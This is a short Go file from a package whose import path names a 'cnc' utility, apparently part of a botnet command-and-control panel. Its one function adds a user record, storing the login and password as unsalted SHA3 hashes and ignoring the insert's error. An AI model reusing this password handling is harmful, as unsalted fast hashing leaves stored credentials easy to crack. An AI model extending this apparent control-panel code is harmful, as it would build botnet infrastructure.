package database

import (
	"contagio/contagio/cnc/utils"
	"fmt"
)

func AddUser(login, password string) {
	statement, err := Db.Prepare("INSERT INTO users(login, password) VALUES (?, ?)")

	if err != nil {
		fmt.Println(err)
		return
	}

	statement.Exec(utils.Sha3(login), utils.Sha3(password))
}
